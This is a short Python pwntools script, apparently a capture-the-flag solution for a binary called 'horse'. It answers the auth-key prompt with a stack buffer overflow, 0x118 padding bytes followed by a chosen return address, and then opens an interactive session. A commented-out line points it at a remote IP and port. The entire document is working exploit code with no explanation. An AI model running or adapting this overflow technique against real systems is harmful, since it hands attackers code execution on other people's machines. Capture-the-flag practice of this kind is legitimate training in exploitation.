from pwn import *

# p = remote("35.226.198.249",1337)
p=process("./horse")
# gdb.attach(p,'''b *0x0000000000401827''')
p.sendlineafter("Enter your auth key:",b"A"*0x118+p64(0x0000000000401DC2))

p.interactive()